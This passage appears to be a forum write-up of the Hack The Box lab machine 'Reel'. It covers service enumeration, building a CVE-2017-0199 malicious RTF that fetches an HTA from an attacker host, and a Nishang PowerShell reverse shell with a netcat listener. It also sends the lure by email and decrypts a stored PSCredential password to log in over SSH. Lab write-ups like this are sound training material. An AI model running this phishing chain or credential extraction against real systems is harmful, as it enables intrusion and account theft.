+|   OS CPE: cpe:/o:microsoft:windows_server_2012::-
+|   Computer name: REEL
+|   NetBIOS computer name: REEL\x00
+|   Domain name: HTB.LOCAL
+|   Forest name: HTB.LOCAL
+|   FQDN: REEL.HTB.LOCAL
+|_  System time: 2019-04-08T06:59:23+01:00
+| smb-security-mode: 
+|   account_used: &lt;blank&gt;
+|   authentication_level: user
+|   challenge_response: supported
+|_  message_signing: required
+| smb2-security-mode: 
+|   2.02: 
+|_    Message signing enabled and required
+| smb2-time: 
+|   date: 2019-04-08 07:59:25
+|_  start_date: 2019-04-08 06:36:42
+
+</code></pre>
+<p>Alright, what do we have so far?<br>
+OS: Windows Server 2012 R2 Standard 9600 6.3<br>
+System time is actual.<br>
+Services:</p>
+<ul>
+<li>FTP (Anonymous Login)</li>
+<li><strong>OpenSSH (?)</strong></li>
+<li>SMTP</li>
+<li>MSRPC</li>
+<li>SMBv2 (REEL.HTB.LOCAL)</li>
+<li>MSRPC over HTTP (TCP 593)</li>
+</ul>
+<p>First thing what looks different is the <strong>OpenSSH</strong> service because Windows doesn’t have SSH as default service.</p>
+<p>So here we can take a deeper look at it and see which banner we will get from this service.</p>
+<blockquote>
+<p>nc -nv 10.10.10.77 22</p>
+</blockquote>
+<p><img src="https://0x00sec.s3.amazonaws.com/original/2X/b/bea108901196c0a0c66e2f38de141a758eabe54b.png" alt="grafik" data-base62-sha1="rcnJnDSOsP0ZTNQx93QYzqXdNEf" width="582" height="82"></p>
+<p>Ok. Not much interesting here. Let’s take a look inside SMTP.<br>
+There exist a few interesting tools we could use, but my favourites are <strong>smtp-user-enum.py</strong> and <strong>ismtp</strong>.</p>
+<p>But first, we should take a look which commands are allowed on this SMTP server:</p>
+<blockquote>
+<p>telnet 10.10.10.77 25</p>
+</blockquote>
+<p></p><div class="lightbox-wrapper"><a class="lightbox" href="https://0x00sec.s3.amazonaws.com/original/2X/e/e74f96456acb7979f7974fb2aa4c33fb73381c08.png" data-download-href="/uploads/short-url/x0gOdKj0d9H7HUuT4xAXpXtF3gQ.png?dl=1" title="grafik" rel="noopener nofollow ugc"><img src="https://0x00sec.s3.amazonaws.com/original/2X/e/e74f96456acb7979f7974fb2aa4c33fb73381c08.png" alt="grafik" data-base62-sha1="x0gOdKj0d9H7HUuT4xAXpXtF3gQ" width="403" height="317"></a></div><p></p>
+<p>Now we know that the <strong>VRFY</strong> command is disallowed and it looks like we won’t be able to enumerate some users successfully. The reason for this is the reply for the <strong>RCPT TO</strong> command I typed before.<br>
+If a username that doesn’t exist will be entered (<strong>idontexist</strong>) and the server replies with a <strong>250</strong> instead of <strong>550</strong> response code it seems to be well configured to prevent user enumeration.</p>
+<p>A good reference for <strong>SMTP commands</strong> you can find <a href="http://www.samlogic.net/articles/smtp-commands-reference.htm" rel="noopener nofollow ugc">here</a>.<br>
+Thanks <strong>Mika Larramo</strong> for this!</p>
+<p>So even if we use our tools we won’t give any useful result:</p>
+<p><strong>ismtp</strong></p>
+<blockquote>
+<p>ismtp -h 10.10.10.77 -e /usr/share/seclists/Usernames/top-usernames-shortlist.txt -l 3</p>
+</blockquote>
+<p><strong>smtp-user-enum.py</strong></p>
+<blockquote>
+<p>smtp-user-enum -u administrator -t 10.10.10.77 -M VRFY</p>
+</blockquote>
+<h2><a name="p-39495-h-2-ftp-3" class="anchor" href="https://d.clarkee.co.uk#p-39495-h-2-ftp-3"></a>2. FTP</h2>
+<p>Next step.<br>
+As you noticed - Anonymous login is enabled for the FTP service. Let us use it to enumerate the machine a little bit more.</p>
+<p>Credentials used:<br>
+<code>anonymous:anon</code></p>
+<blockquote>
+<p>ftp 10.10.10.77</p>
+</blockquote>
+<p></p><div class="lightbox-wrapper"><a class="lightbox" href="https://0x00sec.s3.amazonaws.com/original/2X/1/1becc45b7b0024737f6dca0603a32a3f111d5771.png" data-download-href="/uploads/short-url/3Z2a5r7Amz5R8u0lUMolV4l6RSF.png?dl=1" title="grafik" rel="noopener nofollow ugc"><img src="https://0x00sec.s3.amazonaws.com/original/2X/1/1becc45b7b0024737f6dca0603a32a3f111d5771.png" alt="grafik" data-base62-sha1="3Z2a5r7Amz5R8u0lUMolV4l6RSF" width="681" height="432"></a></div><p></p>
+<p>Here we discovered some interesting files. There exist a few methods you can download them.<br>
+Because we already logged in I will use:</p>
+<blockquote>
+<p>ftp&gt; mget *.*</p>
+</blockquote>
+<p>Otherwise, you can download all these files with wget:</p>
+<blockquote>
+<p>wget -m --no-passive-ftp <a>ftp://anonymous:anon@10.10.10.77</a></p>
+</blockquote>
+<p></p><div class="lightbox-wrapper"><a class="lightbox" href="https://0x00sec.s3.amazonaws.com/original/2X/4/4d11c5b63e49a083369c3ea788c0bfda445853d8.png" data-download-href="/uploads/short-url/aZMQdwpqNzQB2Y1citOVdZxgeko.png?dl=1" title="grafik" rel="noopener nofollow ugc"><img src="https://0x00sec.s3.amazonaws.com/original/2X/4/4d11c5b63e49a083369c3ea788c0bfda445853d8.png" alt="grafik" data-base62-sha1="aZMQdwpqNzQB2Y1citOVdZxgeko" width="676" height="116"></a></div><p></p>
+<p>Alright, let’s analyse the files.</p>
+<p><strong>AppLocker.docx</strong><br>
+For this file, I used LibreOffice Writer to take a look at how it does look.</p>
+<p></p><div class="lightbox-wrapper"><a class="lightbox" href="https://0x00sec.s3.amazonaws.com/original/2X/2/2347d9ec3442cea986efd292c62dae1f46398ea2.png" data-download-href="/uploads/short-url/526EqBdwlEuPGbUAcUFsK4gEtTs.png?dl=1" title="grafik" rel="noopener nofollow ugc"><img src="https://0x00sec.s3.amazonaws.com/original/2X/2/2347d9ec3442cea986efd292c62dae1f46398ea2.png" alt="grafik" data-base62-sha1="526EqBdwlEuPGbUAcUFsK4gEtTs" width="690" height="353"></a></div><p></p>
+<p>Interesting. It gives us a little bit of information about the procedure. Let us look a little bit deeper:</p>
+<blockquote>
+<p>exiftool AppLocker.docx<br>
+strings AppLocker.docx</p>
+</blockquote>
+<p></p><div class="lightbox-wrapper"><a class="lightbox" href="https://0x00sec.s3.amazonaws.com/original/2X/2/2dbf4ad1b9eec1c39cf9848cd37404a4601b2af2.png" data-download-href="/uploads/short-url/6wHkkEkRm6l9y8dYbnDSbsdX0Ea.png?dl=1" title="grafik" rel="noopener nofollow ugc"><img src="https://0x00sec.s3.amazonaws.com/original/2X/2/2dbf4ad1b9eec1c39cf9848cd37404a4601b2af2.png" alt="grafik" data-base62-sha1="6wHkkEkRm6l9y8dYbnDSbsdX0Ea" width="537" height="499"></a></div><p></p>
+<p>Ok. Nothing interesting here.</p>
+<p><strong>readme.txt</strong></p>
+<blockquote>
+<p>cat readme.txt</p>
+</blockquote>
+<p>Output:</p>
+<blockquote>
+<p>please email me any rtf format procedures - I’ll review and convert. new format / converted documents will be saved here.</p>
+</blockquote>
+<p>That looks interesting. What do we see here?</p>
+<ul>
+<li><code>"email me"</code></li>
+<li><code>rtf format</code></li>
+<li><code>"I will review and convert"</code></li>
+<li><code>converted documents will be saved here</code></li>
+</ul>
+<p>Ok. What do we need?<br>
+Do we have an email address? No.<br>
+RTF format file?</p>
+<p>From here you’re starting to think about <code>how should I found out a valid email address if SMTP doesn't return in/valid usernames?</code></p>
+<p>Stop.<br>
+You have to still organised. Follow your methodology even if you don’t have one yet. Your goal is to get an overview of your target. Before you start to go deeper enumeration finish your process you started.<br>
+What did we do?<br>
+Did we extract all information from all files? - I don’t think so.</p>
+<p><strong>‘Windows Event Forwarding.docx’</strong><br>
+Also here I tried to open this document to take a look at it but…</p>
+<p></p><div class="lightbox-wrapper"><a class="lightbox" href="https://0x00sec.s3.amazonaws.com/original/2X/f/ff530638cf28e94fc24c5a090011925028966f08.png" data-download-href="/uploads/short-url/AqHDi0jkBmDKJmO1RgzeO0RxEj6.png?dl=1" title="grafik" rel="noopener nofollow ugc"><img src="https://0x00sec.s3.amazonaws.com/original/2X/f/ff530638cf28e94fc24c5a090011925028966f08.png" alt="grafik" data-base62-sha1="AqHDi0jkBmDKJmO1RgzeO0RxEj6" width="690" height="466"></a></div><p></p>
+<p>Now it could be dangerous to start the repair process because LibreOffice might overwrite some data inside it which could be relevant for us. Additionally, it could fail too.</p>
+<p></p><div class="lightbox-wrapper"><a class="lightbox" href="https://0x00sec.s3.amazonaws.com/original/2X/7/7f91f74da6d24bf4b28e6c3a37f1045310f229fe.png" data-download-href="/uploads/short-url/icxmUrdbtIIYB626YFbriIBVEdM.png?dl=1" title="grafik" rel="noopener nofollow ugc"><img src="https://0x00sec.s3.amazonaws.com/original/2X/7/7f91f74da6d24bf4b28e6c3a37f1045310f229fe.png" alt="grafik" data-base62-sha1="icxmUrdbtIIYB626YFbriIBVEdM" width="499" height="152"></a></div><p></p>
+<blockquote>
+<p>exiftool Windows\ Event\ Forwarding.docx</p>
+</blockquote>
+<p></p><div class="lightbox-wrapper"><a class="lightbox" href="https://0x00sec.s3.amazonaws.com/original/2X/8/826831bf534ddaea3a82c5fb3eb3adb06fd85d24.png" data-download-href="/uploads/short-url/iBDj04K8BFJAimQXmxSwnEhoJi4.png?dl=1" title="grafik" rel="noopener nofollow ugc"><img src="https://0x00sec.s3.amazonaws.com/original/2X/8/826831bf534ddaea3a82c5fb3eb3adb06fd85d24.png" alt="grafik" data-base62-sha1="iBDj04K8BFJAimQXmxSwnEhoJi4" width="614" height="500"></a></div><p></p>
+<p>It becomes interesting.<br>
+In this document was stored the email address of the creator.</p>
+<blockquote>
+<p><a href="mailto:nico@megabank.com">nico@megabank.com</a></p>
+</blockquote>
+<p>I marked all information which should be noted for later enumeration. You should write it down because you won’t know which data will be required to root this box later.</p>
+<h2><a name="p-39495-h-3-exploitation-research-4" class="anchor" href="https://d.clarkee.co.uk#p-39495-h-3-exploitation-research-4"></a>3. Exploitation Research</h2>
+<p>Back to our questions:<br>
+Do we have an email address? <strong>Yes</strong>.<br>
+RTF format file?<br>
+If there is a file extension, you don’t know then google for it.</p>
+<blockquote>
+<p>Google: rtf file</p>
+</blockquote>
+<p>This search will lead you to <a href="https://fileinfo.com/extension/rtf" class="inline-onebox" rel="noopener nofollow ugc">RTF File - What is an .rtf file and how do I open it?</a>.</p>
+<blockquote>
+<p>An RTF file is a common text file format that supports “rich text.” It includes several types of text formatting, such as bold type, italics, different fonts and font sizes, and custom tab settings. RTF files also support objects and images, such as .JPG and .PNG files, saved within the text file.</p>
+</blockquote>
+<p>Beneficial information for us. Now let’s search for exploits.</p>
+<blockquote>
+<p>Google: rtf exploit</p>
+</blockquote>
+<p>The first result will show you an exploit toolkit from bhdresh</p>
+<aside class="onebox githubrepo" data-onebox-src="https://github.com/bhdresh/CVE-2017-0199">
+  <header class="source">
+
+      <a href="https://github.com/bhdresh/CVE-2017-0199" target="_blank" rel="noopener nofollow ugc">github.com</a>
+  </header>
+
+  <article class="onebox-body">
+    <div class="github-row" data-github-private-repo="false">
+  <img width="690" height="344" src="https://opengraph.githubassets.com/42da98610c6c2ffbfab6645bdff25e15/bhdresh/CVE-2017-0199" class="thumbnail">
+
+  <h3><a href="https://github.com/bhdresh/CVE-2017-0199" target="_blank" rel="noopener nofollow ugc">GitHub - bhdresh/CVE-2017-0199: Exploit toolkit CVE-2017-0199 - v4.0 is a handy...</a></h3>
+
+    <p><span class="github-repo-description">Exploit toolkit CVE-2017-0199 - v4.0 is a handy python script which provides pentesters and security researchers a quick and effective way to test Microsoft Office RCE. It could generate a malicious RTF/PPSX file and deliver metasploit / meterpreter / other payload to victim without any complex configuration.</span></p>
+</div>
+
+  </article>
+
+  <div class="onebox-metadata">
+    
+    
+  </div>
+
+  <div style="clear: both"></div>
+</aside>
+
+<p>with a full description of the exploit and usage. We will use his script to generate our malicious RTF file.</p>
+<p>Here you should read a little bit more about this vulnerability.<br>
+This is important. Not for me. It’s crucial for <strong>you</strong>.<br>
+You should understand the attack structure and how it will look like.</p>
+<p>I will come back to the attack structure later.</p>
+<h2><a name="p-39495-h-4-rtf-file-creation-5" class="anchor" href="https://d.clarkee.co.uk#p-39495-h-4-rtf-file-creation-5"></a>4. RTF file creation</h2>
+<p>Let us create our RTF file.</p>
+<blockquote>
+<p>python cve-2017-0199_toolkit.py -M gen -w sha.rtf -t RTF -u http://&lt;attacker&gt;/sha.hta</p>
+</blockquote>
+<p></p><div class="lightbox-wrapper"><a class="lightbox" href="https://0x00sec.s3.amazonaws.com/original/2X/c/c338f5659f812e748d23cd3ffba8bf03adb2c15c.png" data-download-href="/uploads/short-url/rR18FUMd8D8jGNdh0A7RbtZmxl2.png?dl=1" title="grafik" rel="noopener nofollow ugc"><img src="https://0x00sec.s3.amazonaws.com/original/2X/c/c338f5659f812e748d23cd3ffba8bf03adb2c15c.png" alt="grafik" data-base62-sha1="rR18FUMd8D8jGNdh0A7RbtZmxl2" width="690" height="70"></a></div><p></p>
+<p>Here you can notice that we need another file with a .hta extension?<br>
+And again, what is HTA?</p>
+<p>Definition from <a href="https://fileinfo.com/extension/hta" class="inline-onebox" rel="noopener nofollow ugc">HTA File - What is an .hta file and how do I open it?</a> :</p>
+<blockquote>
+<p>Program that can be run from an HTML document; an executable file that contains hypertext code and may also contain VBScript or JScript code; can be created by simply changing the file extension of an .HTM file to an “.HTA” extension; run by the Microsoft HTML Application Host (Mshta.exe).</p>
+</blockquote>
+<p>And again. Crucial information we can use.</p>
+<h2><a name="p-39495-h-5-hta-file-creation-6" class="anchor" href="https://d.clarkee.co.uk#p-39495-h-5-hta-file-creation-6"></a>5. HTA file creation</h2>
+<p>There exist multiple methods to create a malicious HTA file.<br>
+We could use <strong>unicorn.py</strong> or <strong>Metasploit</strong>, but I will use a PowerShell script from <strong>Nishang</strong>.</p>
+<p>Therefore you will need to install PowerShell on Kali, or you execute it on your Windows machine. I will use <strong>pwsh</strong> on Kali here.</p>
+<blockquote>
+<p>cd /usr/share/nishang/Client/OUT-HTA.ps1<br>
+pwsh</p>
+</blockquote>
+<p></p><div class="lightbox-wrapper"><a class="lightbox" href="https://0x00sec.s3.amazonaws.com/original/2X/6/69f79ac87f359aa224c8ab61b7421c1ee435f634.png" data-download-href="/uploads/short-url/f7qCJVVCusjUHeZ1yqx2ijRlPj6.png?dl=1" title="grafik" rel="noopener nofollow ugc"><img src="https://0x00sec.s3.amazonaws.com/original/2X/6/69f79ac87f359aa224c8ab61b7421c1ee435f634.png" alt="grafik" data-base62-sha1="f7qCJVVCusjUHeZ1yqx2ijRlPj6" width="558" height="416"></a></div><p></p>
+<p>And this point there exists a little bug. But I think you will be able to solve it on your own. <img src="https://d.clarkee.co.uk/images/emoji/twitter/wink.png?v=15" title=":wink:" class="emoji" alt=":wink:" loading="lazy" width="20" height="20"></p>
+<p><img src="https://0x00sec.s3.amazonaws.com/original/2X/d/db59ddf68cc18aded3439fd2b59afda7fed76286.png" alt="grafik" data-base62-sha1="vit6wHk2vpRqeG7X4CI0SxeBpt4" width="690" height="79"></p>
+<p>Do you understand what we’re doing right now? Why did we create an RTF file and HTA file? And why we will create a PS1 file in the next step?<br>
+At this point, when you feel like you lost the overview, then you should take a step back and return to the point where you understood the full structure of your target.</p>
+<p>Now we will create our PS1 reverse shell.<br>
+How will the attack look like?</p>
+<p>First, we should exactly know what we have:</p>
+<ol>
+<li>RTF file with a redirection to our HTA file.<br>
+Send Email w/ RTF → HTA</li>
+<li>HTA file with a redirection to our PS1 file (Reverse Shell)<br>
+Send Email w/ RTF → HTA → PS1</li>
+</ol>
+<p><strong>PS1 Reverse Shell</strong><br>
+Also here I will use a script from <strong>Nishang</strong>.<br>
+It’s stored by default in <code>/usr/share/nishang/Shells/</code> directory.</p>
+<blockquote>
+<p>cp /usr/share/nishang/Shells/Invoke-PowerShellTcp.ps1 /var/www/html/sha.ps1</p>
+</blockquote>
+<p>Now we have to edit out reverse shell to make it executable.</p>
+<p></p><div class="lightbox-wrapper"><a class="lightbox" href="https://0x00sec.s3.amazonaws.com/original/2X/9/9d052d1f6db82ff1f582d6c8b2f12ec61e03f0d7.png" data-download-href="/uploads/short-url/mp43hx1zFKpP1M3dcCWcE72AINF.png?dl=1" title="grafik" rel="noopener nofollow ugc"><img src="https://0x00sec.s3.amazonaws.com/original/2X/9/9d052d1f6db82ff1f582d6c8b2f12ec61e03f0d7.png" alt="grafik" data-base62-sha1="mp43hx1zFKpP1M3dcCWcE72AINF" width="690" height="245"></a></div><p></p>
+<p>Copy the marked PS line at the end of the script and edit it. It should look something like this:</p>
+<p></p><div class="lightbox-wrapper"><a class="lightbox" href="https://0x00sec.s3.amazonaws.com/original/2X/f/fc41d6d31cd2255506a258e55aeadf2d177d63ad.png" data-download-href="/uploads/short-url/zZznHySPDunOonalxJcocd3PKFf.png?dl=1" title="grafik" rel="noopener nofollow ugc"><img src="https://0x00sec.s3.amazonaws.com/original/2X/f/fc41d6d31cd2255506a258e55aeadf2d177d63ad.png" alt="grafik" data-base62-sha1="zZznHySPDunOonalxJcocd3PKFf" width="690" height="279"></a></div><p></p>
+<h2><a name="p-39495-h-6-exploitation-7" class="anchor" href="https://d.clarkee.co.uk#p-39495-h-6-exploitation-7"></a>6. Exploitation</h2>
+<p>Now let us send the email and hope that he will open it.<br>
+But before we send the email, we should turn on our Web server and our listener.</p>
+<p>Make sure you run the web server and the <strong>sendemail</strong> SMTP client from the directory where the files we created are stored.</p>
+<p><strong>Web server</strong><br>
+For the web server, you can use Python2 or Python3, ,but I will use Apache.</p>
+<p>For Python2:</p>
+<blockquote>
+<p>python -m SimpleHTTPServer &lt;Port&gt;</p>
+</blockquote>
+<p>For Python3:</p>
+<blockquote>
+<p>python3 -m http.server &lt;Port&gt;</p>
+</blockquote>
+<p>Apache:<br>
+service apache2 start</p>
+<p><strong>Reverse Shell Listener</strong>:</p>
+<blockquote>
+<p>nc -nlvp 2202</p>
+</blockquote>
+<p>Now the exploit:</p>
+<blockquote>
+<p>sendemail -f <a href="mailto:shelly@megabank.com">shelly@megabank.com</a> -t <a href="mailto:nico@megabank.com">nico@megabank.com</a> -u Update -m “Please update RTF file.” -a sha.rtf -s 10.10.10.77</p>
+</blockquote>
+<p>It could take a moment before you get a reverse shell back.<br>
+Additionally, you can run <strong>tcpdump</strong> or <strong>WireShark</strong> to capture the traffic and make sure that everything looks like we want.</p>
+<p>Then it should look like the following:</p>
+<p></p><div class="lightbox-wrapper"><a class="lightbox" href="https://0x00sec.s3.amazonaws.com/original/2X/2/23ad88bb58d798779c6413391b9b1c4a29373d7f.png" data-download-href="/uploads/short-url/55CvphVM3QKVhB2UkpJCCpFXh8P.png?dl=1" title="grafik" rel="noopener nofollow ugc"><img src="https://0x00sec.s3.amazonaws.com/original/2X/2/23ad88bb58d798779c6413391b9b1c4a29373d7f.png" alt="grafik" data-base62-sha1="55CvphVM3QKVhB2UkpJCCpFXh8P" width="690" height="263"></a></div><p></p>
+<h2><a name="p-39495-h-7-local-enumeration-8" class="anchor" href="https://d.clarkee.co.uk#p-39495-h-7-local-enumeration-8"></a>7. Local Enumeration</h2>
+<p>Great! We’ve got a reverse shell. Let us do some basic enumeration stuff.</p>
+<blockquote>
+<p>whoami<br>
+net users<br>
+net groups</p>
+</blockquote>
+<p></p><div class="lightbox-wrapper"><a class="lightbox" href="https://0x00sec.s3.amazonaws.com/original/2X/f/f4212e53b0f2f029fb400b1d7a0b6616d5c8a56b.png" data-download-href="/uploads/short-url/yPFAKfOhkoWhYcSmcfslnDDpO6D.png?dl=1" title="grafik" rel="noopener nofollow ugc"><img src="https://0x00sec.s3.amazonaws.com/original/2X/f/f4212e53b0f2f029fb400b1d7a0b6616d5c8a56b.png" alt="grafik" data-base62-sha1="yPFAKfOhkoWhYcSmcfslnDDpO6D" width="400" height="500"></a></div><p></p>
+<blockquote>
+<p>systeminfo</p>
+</blockquote>
+<p>Systeminfo gives us a lot of information like:<br>
+OS: <strong>Microsoft Windows Server 2012 R2 Standard</strong><br>
+OS Version: <strong>6.3.9600 N/A Build 9600</strong><br>
+OS Configuration: <strong>Primary Domain Controller</strong><br>
+System Type: <strong>x64-based PC</strong><br>
+Hotfix(s): <strong>95 Hotfix(s) Installed.</strong></p>
+<ul>
+<li>[1]: KB2894852</li>
+<li>…</li>
+<li>[95]: KB4054519</li>
+</ul>
+<p>This hotfix(s) means that the server last update is from 12. Dec 2017. So it’s possible to find some local privilege exploits. We add this step to our To-Do-List.</p>
+<p>It’s always interesting what the user we’ve access to has in his home directory.</p>
+<p></p><div class="lightbox-wrapper"><a class="lightbox" href="https://0x00sec.s3.amazonaws.com/original/2X/e/e854361b5d94b2be39fd8da2b9dd45834e131bc3.png" data-download-href="/uploads/short-url/x9hc67oMSH8FTz5NWMQFQuyjBkf.png?dl=1" title="grafik" rel="noopener nofollow ugc"><img src="https://0x00sec.s3.amazonaws.com/original/2X/e/e854361b5d94b2be39fd8da2b9dd45834e131bc3.png" alt="grafik" data-base62-sha1="x9hc67oMSH8FTz5NWMQFQuyjBkf" width="517" height="374"></a></div><p></p>
+<p>Ok. No different directories here. Let’s look at his desktop.</p>
+<p></p><div class="lightbox-wrapper"><a class="lightbox" href="https://0x00sec.s3.amazonaws.com/original/2X/9/9d1362f75332534fd35760291f479a1d8464c8c6.png" data-download-href="/uploads/short-url/mpyuTXSZFYcetqmwRr2dHMz1rwO.png?dl=1" title="grafik" rel="noopener nofollow ugc"><img src="https://0x00sec.s3.amazonaws.com/original/2X/9/9d1362f75332534fd35760291f479a1d8464c8c6.png" alt="grafik" data-base62-sha1="mpyuTXSZFYcetqmwRr2dHMz1rwO" width="496" height="208"></a></div><p></p>
+<p>And here we found our <strong>user.txt</strong>.</p>
+<blockquote>
+<p>type user.txt</p>
+</blockquote>
+<p><img src="https://0x00sec.s3.amazonaws.com/original/2X/4/4d985f51b3c8e99d803339af16cb7edec3ebb14b.png" alt="grafik" data-base62-sha1="b4rdJhITLR9k0gDmG1DRciV7WZ5" width="367" height="43"></p>
+<p>But the <strong>creds.xml</strong> looks very interesting.</p>
+<p></p><div class="lightbox-wrapper"><a class="lightbox" href="https://0x00sec.s3.amazonaws.com/original/2X/7/7f0094a50be409159f7dd617c2ab2ff6bba6bbeb.png" data-download-href="/uploads/short-url/i7vSJmL7d0j7Gv9t8vosUxKTmDp.png?dl=1" title="grafik" rel="noopener nofollow ugc"><img src="https://0x00sec.s3.amazonaws.com/original/2X/7/7f0094a50be409159f7dd617c2ab2ff6bba6bbeb.png" alt="grafik" data-base62-sha1="i7vSJmL7d0j7Gv9t8vosUxKTmDp" width="690" height="176"></a></div><p></p>
+<p>What do we have here?</p>
+<ol>
+<li>XML file</li>
+<li>Objs Version 1.1.0.1</li>
+<li>PSCredential</li>
+<li>Username: Tom</li>
+<li>Password: &lt;hash&gt;</li>
+</ol>
+<h2><a name="p-39495-h-8-extract-password-from-an-xml-file-9" class="anchor" href="https://d.clarkee.co.uk#p-39495-h-8-extract-password-from-an-xml-file-9"></a>8. Extract Password from an XML file</h2>
+<p>The main question here is:</p>
+<blockquote>
+<p>how can we extract the password from this file?</p>
+</blockquote>
+<p>Ask Google:</p>
+<blockquote>
+<p>Google: extract password from pscredential xml</p>
+</blockquote>
+<p>On the first page you will find this post:</p><aside class="onebox stackexchange" data-onebox-src="https://stackoverflow.com/questions/40029235/save-pscredential-in-the-file">
+  <header class="source">
+
+      <a href="https://stackoverflow.com/questions/40029235/save-pscredential-in-the-file" target="_blank" rel="noopener nofollow ugc">stackoverflow.com</a>
+  </header>
+
+  <article class="onebox-body">
+      <a href="https://stackoverflow.com/users/240564/alexan" target="_blank" rel="noopener nofollow ugc">
+    
+  </a>
+
+<h4>
+  <a href="https://stackoverflow.com/questions/40029235/save-pscredential-in-the-file" target="_blank" rel="noopener nofollow ugc">save PSCredential in the file</a>
+</h4>
+
+<div class="tags">
+  <strong>powershell, credentials</strong>
+</div>
+
+<div class="date">
+  asked by
+  
+  <a href="https://stackoverflow.com/users/240564/alexan" target="_blank" rel="noopener nofollow ugc">
+    Alexan
+  </a>
+  on <a href="https://stackoverflow.com/questions/40029235/save-pscredential-in-the-file" target="_blank" rel="noopener nofollow ugc">07:19PM - 13 Oct 16 UTC</a>
+</div>
+
+  </article>
+
+  <div class="onebox-metadata">
+    
+    
+  </div>
+
+  <div style="clear: both"></div>
+</aside>
+
+<p></p><div class="lightbox-wrapper"><a class="lightbox" href="https://0x00sec.s3.amazonaws.com/original/2X/4/4b91e1e470d67f1600c12dcba51c7e69c2bf54c9.png" data-download-href="/uploads/short-url/aMwmr12ImBv0tUkEWsnmiwf9vcZ.png?dl=1" title="grafik" rel="noopener nofollow ugc"><img src="https://0x00sec.s3.amazonaws.com/original/2X/4/4b91e1e470d67f1600c12dcba51c7e69c2bf54c9.png" alt="grafik" data-base62-sha1="aMwmr12ImBv0tUkEWsnmiwf9vcZ" width="517" height="198"></a></div><p></p>
+<blockquote>
+<p>PS C:\Users\nico\Desktop&gt; $credential = import-clixml -path cred.xml</p>
+</blockquote>
+<p>Now we are using this XML file but how to extract the encrypted password?</p>
+<blockquote>
+<p>Google: decrypt password from pscredential</p>
+</blockquote>
+<aside class="onebox stackexchange" data-onebox-src="https://stackoverflow.com/questions/7433178/powershell-get-credential-decode-password">
+  <header class="source">
+
+      <a href="https://stackoverflow.com/questions/7433178/powershell-get-credential-decode-password" target="_blank" rel="noopener nofollow ugc">stackoverflow.com</a>
+  </header>
+
+  <article class="onebox-body">
+      <a href="https://stackoverflow.com/users/472123/laphi" target="_blank" rel="noopener nofollow ugc">
+    <img alt="LaPhi" src="https://www.gravatar.com/avatar/ce4d2db6c92eebb93e9d3d419c9b0f06?s=256&amp;d=identicon&amp;r=PG" class="thumbnail onebox-avatar" width="256" height="256">
+  </a>
+
+<h4>
+  <a href="https://stackoverflow.com/questions/7433178/powershell-get-credential-decode-password" target="_blank" rel="noopener nofollow ugc">PowerShell - Get-Credential decode password?</a>
+</h4>
+
+<div class="tags">
+  <strong>powershell, credentials, system.security</strong>
+</div>
+
+<div class="date">
+  asked by
+  
+  <a href="https://stackoverflow.com/users/472123/laphi" target="_blank" rel="noopener nofollow ugc">
+    LaPhi
+  </a>
+  on <a href="https://stackoverflow.com/questions/7433178/powershell-get-credential-decode-password" target="_blank" rel="noopener nofollow ugc">03:11PM - 15 Sep 11 UTC</a>
+</div>
+
+  </article>
+
+  <div class="onebox-metadata">
+    
+    
+  </div>
+
+  <div style="clear: both"></div>
+</aside>
+
+<p></p><div class="lightbox-wrapper"><a class="lightbox" href="https://0x00sec.s3.amazonaws.com/original/2X/2/26b92b8999538adcc2a4c953fb73d938109c4479.png" data-download-href="/uploads/short-url/5wyRS7GkIr2fZuDtJ753lKlbGIN.png?dl=1" title="grafik" rel="noopener nofollow ugc"><img src="https://0x00sec.s3.amazonaws.com/original/2X/2/26b92b8999538adcc2a4c953fb73d938109c4479.png" alt="grafik" data-base62-sha1="5wyRS7GkIr2fZuDtJ753lKlbGIN" width="517" height="169"></a></div><p></p>
+<p>Ok. Let us give a try, but I will change the command for a better output:</p>
+<blockquote>
+<p>PS C:\Users\nico\Desktop&gt; $credential.GetNetworkCredential() | fl</p>
+</blockquote>
+<p></p><div class="lightbox-wrapper"><a class="lightbox" href="https://0x00sec.s3.amazonaws.com/original/2X/4/4e5f0739483a2604dc513936202593364768bbcd.png" data-download-href="/uploads/short-url/bbiQ3R2WrWQ8yEblRMjWXpPUNB3.png?dl=1" title="grafik" rel="noopener nofollow ugc"><img src="https://0x00sec.s3.amazonaws.com/original/2X/4/4e5f0739483a2604dc513936202593364768bbcd.png" alt="grafik" data-base62-sha1="bbiQ3R2WrWQ8yEblRMjWXpPUNB3" width="627" height="159"></a></div><p></p>
+<p>Great! We’ve got the decrypted password for the user Tom.</p>
+<h2><a name="p-39495-h-9-ssh-login-10" class="anchor" href="https://d.clarkee.co.uk#p-39495-h-9-ssh-login-10"></a>9. SSH Login</h2>
+<p>Now lets got to SSH, and we will use the credentials to log in.</p>
+<p></p><div class="lightbox-wrapper"><a class="lightbox" href="https://0x00sec.s3.amazonaws.com/original/2X/2/2478a30404d20d8cbbefefaa5f9086df8a50fd14.png" data-download-href="/uploads/short-url/5cDEqsGGEiHEM9T0sM5wZm75MLG.png?dl=1" title="grafik" rel="noopener nofollow ugc"><img src="https://0x00sec.s3.amazonaws.com/original/2X/2/2478a30404d20d8cbbefefaa5f9086df8a50fd14.png" alt="grafik" data-base62-sha1="5cDEqsGGEiHEM9T0sM5wZm75MLG" width="485" height="140"></a></div><p></p>
+<p>I want to take a look at the home directory of the user <strong>Tom</strong>.</p>
+<p></p><div class="lightbox-wrapper"><a class="lightbox" href="https://0x00sec.s3.amazonaws.com/original/2X/9/952cdfe4ad7540b119f4302aa66aa8575832c812.png" data-download-href="/uploads/short-url/lhFhL6wB1l4nGhy9ZhuXvz4LWLw.png?dl=1" title="grafik" rel="noopener nofollow ugc"><img src="https://0x00sec.s3.amazonaws.com/original/2X/9/952cdfe4ad7540b119f4302aa66aa8575832c812.png" alt="grafik" data-base62-sha1="lhFhL6wB1l4nGhy9ZhuXvz4LWLw" width="469" height="480"></a></div><p></p>
+<p>What is inside the <strong>note.txt</strong>?</p>
+<blockquote>
+<p>type note.txt</p>
+</blockquote>
+<p></p><div class="lightbox-wrapper"><a class="lightbox" href="https://0x00sec.s3.amazonaws.com/original/2X/5/5f8478987602c5bad9820f90f087997b2bdab2f1.png" data-download-href="/uploads/short-url/dCZb0WvcapuE3r9bxDZrCbKkQpP.png?dl=1" title="grafik" rel="noopener nofollow ugc"><img src="https://0x00sec.s3.amazonaws.com/original/2X/5/5f8478987602c5bad9820f90f087997b2bdab2f1.png" alt="grafik" data-base62-sha1="dCZb0WvcapuE3r9bxDZrCbKkQpP" width="690" height="89"></a></div><p></p>
